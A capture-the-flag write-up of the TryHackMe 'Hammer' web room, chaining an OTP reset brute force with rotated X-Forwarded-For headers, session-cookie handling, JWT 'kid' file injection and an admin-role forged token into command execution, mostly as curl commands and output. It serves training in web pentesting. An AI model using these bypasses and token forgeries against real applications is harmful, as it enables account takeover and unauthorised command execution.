# Hammer (TryHackMe)

Room: Hammer — premium Web Application Pentesting / Authentication room. Chain an OTP
password-reset brute force, a session-vs-token auth gap, a command whitelist, and a JWT `kid`
file-path injection into full RCE. Completed: 2026-11-04 | Target: <ip>
(`hammerv1.32-badr`). Solved **fully headless from `C:\CTF`** with `curl` + Python stdlib — no
browser, no AttackBox.

## Answers

| Question | Answer |
|---|---|
| Flag after logging in to the dashboard | `THM{…}` |
| Content of `/home/ubuntu/flag.txt` | `THM{…}` |

## Target

PHP/Apache app on **port 1337** (`http://<ip>:1337/`). All requests below use that base.
Login form `index.php`, reset flow `reset_password.php`, post-auth `dashboard.php` +
`execute_command.php`, `logout.php`. Dev note in the HTML: *"Directory naming convention must be
`hmr_DIRECTORY_NAME`"*.

## 1 — Recon → leaked account email

`hmr_logs/` has directory listing enabled and exposes `error.logs`, a planted Apache log that
leaks the only account's email:

```bash
curl -s http://<ip>:1337/hmr_logs/error.logs | grep -o '[a-z]*@hammer.thm' | sort -u
# tester@hammer.thm
```

(The log also name-drops `/var/www/html/` and `/home/ubuntu/` — note those are a **decoy**; the
real docroot is not `/var/www/html`, see step 4.)

## 2 — Password-reset OTP brute force

`reset_password.php` emails a **4-digit** recovery code, then shows a code-entry form. Two guards,
both bypassable:

- **Rate limit is keyed on `X-Forwarded-For`.** Each distinct XFF gets a fresh bucket
  (`Rate-Limit-Pending: 9`). Observed: no XFF depletes the real-IP bucket; a new XFF resets it to 9.
  → send a **unique XFF per request** and the limit is never hit.
- **The 180 s window is client-controlled.** The hidden field `s` seeds the countdown (the server
  echoes it straight back into `let countdownv = <s>`), so sending a large `s` keeps the window open.

The code is tied to the **reset session** (`PHPSESSID`), so every guess must reuse the one cookie
set when the email was submitted. Wrong code → `Invalid or expired recovery code!`; correct code →
the page switches to a **"Reset Your Password"** form.

```bash
# seed a reset session and capture PHPSESSID
curl -s -c hj -b hj -o /dev/null http://<ip>:1337/reset_password.php
curl -s -c hj -b hj -o /dev/null -d "email=tester@hammer.thm" http://<ip>:1337/reset_password.php
SID=$(awk '/PHPSESSID/{print $7}' hj)
python hammer_bf.py "$SID"      # threaded: unique XFF/req, s=250, stops on non-error
```

`hammer_bf.py` (15 threads, one persistent connection each, shared `PHPSESSID`, unique XFF per
request) found the code in ~50 s:

```
HIT code=<redacted-secret> status=200
```

Then set a new password and log in:

```bash
curl -s -b hj -c hj -d "new_password=Hammer123!&confirm_password=Hammer123!" \
     http://<ip>:1337/reset_password.php          # 302 -> index.php
curl -s -c lj -d "email=tester@hammer.thm&password=Hammer123!" \
     http://<ip>:1337/index.php                   # 302 -> dashboard.php, sets token + PHPSESSID
```

## 3 — Flag 1: dashboard needs session **and** token together

Login sets three cookies: `PHPSESSID`, a JWT `token`, and `persistentSession=no` (Max-Age **20 s**).
`dashboard.php` is **not** role-gated — it just requires the logged-in `PHPSESSID` *alongside* the
token. Sending only the `token` cookie (as I first did) redirects to `logout.php`, which is a
red herring that looks like a role check. With the **full cookie jar** it renders:

```bash
curl -s -b lj http://<ip>:1337/dashboard.php | grep -o 'THM{…}]*}'
# THM{…}
```

JWT decoded (header / payload):

```json
{"typ":"JWT","alg":"HS256","kid":"/var/www/mykey.key"}
{"iss":"http://hammer.thm","aud":"http://hammer.thm","iat":...,"exp":...,
 "data":{"user_id":1,"email":"tester@hammer.thm","role":"user"}}
```

The dashboard has a command box that POSTs `{"command":"..."}` JSON to `execute_command.php` with
`Authorization: Bearer <token>` (the user JWT is embedded in the page).

## 4 — Flag 2: command whitelist + JWT `kid` file injection → RCE

`execute_command.php` requires the **session cookies + a valid Bearer JWT**, then applies a tight
command whitelist. Behaviour mapped empirically (re-login before each request — the 20 s
`persistentSession` expiry otherwise silently 302s to logout with an empty body):

- `role:user` is accepted. Only the exact command **`ls`** runs; `ls -la`, `id`, `ls;id`,
  `ls\nid`, `lsx`, `LS` all → `{"error":"Command not allowed"}`. Leading/trailing whitespace
  (`" ls"`, `"ls\n"`) is fine → the check is effectively `in_array(trim($cmd), $whitelist)` and it
  executes the trimmed value, so no separator/newline injection.
- `ls` reveals the app dir, including a key file: **`188ade1.key`**.

The JWT verifier loads its key via **`file_get_contents($header->kid)`** — a forged token with
`kid:/var/www/mykey.key` returns `{"error":"Invalid token: Key file not found."}`, i.e. that path
doesn't exist and **the `kid` is attacker-controlled**. The real key is web-readable:

```bash
curl -s http://<ip>:1337/188ade1.key      # <redacted-hash>
```

So point `kid` at a file whose content I know. Absolute `/var/www/html/188ade1.key` → *not found*
(docroot isn't there). A **relative** `kid` resolves against the app's CWD and hits it:

```bash
KEY=<redacted-hash>
ADM=$(python hammer_forge.py "188ade1.key" "$KEY" admin)   # kid=188ade1.key (relative), role=admin
curl -s -c fj -d "email=tester@hammer.thm&password=Hammer123!" http://<ip>:1337/index.php -o /dev/null
curl -s -b fj -X POST http://<ip>:1337/execute_command.php \
     -H "Authorization: Bearer $ADM" -H "Content-Type: application/json" \
     --data '{"command":"id"}'
# {"output":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"}
```

**`role:admin` bypasses the whitelist entirely** → arbitrary command execution:

```bash
curl -s -b fj -X POST http://<ip>:1337/execute_command.php \
     -H "Authorization: Bearer $ADM" -H "Content-Type: application/json" \
     --data '{"command":"cat /home/ubuntu/flag.txt"}'
# {"output":"THM{…}\n"}
```

`hammer_forge.py` builds the token with Python stdlib (`hmac`/`hashlib`/`base64`): header
`{"typ":"JWT","alg":"HS256","kid":<arg1>}`, payload with `role:admin`, HMAC-SHA256 over
`b64(header).b64(payload)` using `<arg2>` as the secret (accepts `@file` to key from raw bytes).

## Lessons

- **"Redirect to logout" is an ambiguous oracle.** Here it fired for *three different* reasons:
  missing session cookie, non-admin role on `execute_command.php`, and expired `persistentSession`.
  I burned time forging admin tokens for `dashboard.php` when it only needed the `PHPSESSID`.
  Confirm *what* an endpoint actually checks (send each cookie/claim in isolation) before assuming
  a role gate.
- **Per-IP rate limits die to `X-Forwarded-For`.** A unique XFF per request keeps
  `Rate-Limit-Pending` pinned at max; the 4-digit space falls in under a minute. Also: a
  client-supplied countdown seed (`s`) is not a time limit.
- **A JWT `kid` used in `file_get_contents` is a key-injection primitive.** You don't need to crack
  or read the "official" key path — point `kid` at any file whose bytes you know (here the
  web-served `188ade1.key`) and sign with those. `rockyou` was a dead end precisely because the
  secret is a random 32-hex file, not a dictionary word. A **relative** `kid` sidesteps not knowing
  the absolute docroot (resolves against the PHP CWD).
- **A `trim()`+`in_array` command whitelist has no injection seam** (it runs the trimmed value), but
  it was irrelevant once `role:admin` bypassed the filter. The intended "RCE" was the JWT privilege
  escalation, not shell metacharacter smuggling.
- **Headless pattern** (same as [[jwt-security]], [[oauth-vulnerabilities]], [[multi-factor-authentication]]):
  `curl` for the HTTP flow, Python stdlib for JWT forging and threaded brute force, everything run
  from `C:\CTF`. Re-login before each `execute_command.php` call to stay inside the 20 s
  `persistentSession` window.
